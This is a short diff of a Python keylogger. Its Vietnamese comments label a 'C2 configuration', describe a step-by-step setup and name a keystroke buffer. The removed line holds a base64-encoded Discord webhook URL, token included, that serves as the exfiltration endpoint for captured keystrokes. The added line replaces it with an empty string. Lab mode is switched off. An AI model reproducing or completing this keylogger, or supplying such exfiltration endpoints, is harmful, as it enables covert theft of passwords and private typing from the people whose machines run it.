@@ -12,7 +12,7 @@ import sys
 LAB_MODE = False
 # === CẤU HÌNH C2 ===
 # Dán cái link Webhook vừa copy ở Bước 1 vào đây
-ENCODED_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwNDEwNDQ3NjQxNDQ0MzY2Mi9pT0UxcjBrelRURm9kVUs5QThGSUROWHA5TGcyT3JBSWxoWWpSa19Qd3RvOE9sZG8xUWNGNXVBMjBqTG15elN5X1RpcQ=="
+ENCODED_WEBHOOK = ""
 
 # Bộ đệm chứa các phím gõ
 keystroke_buffer = ""
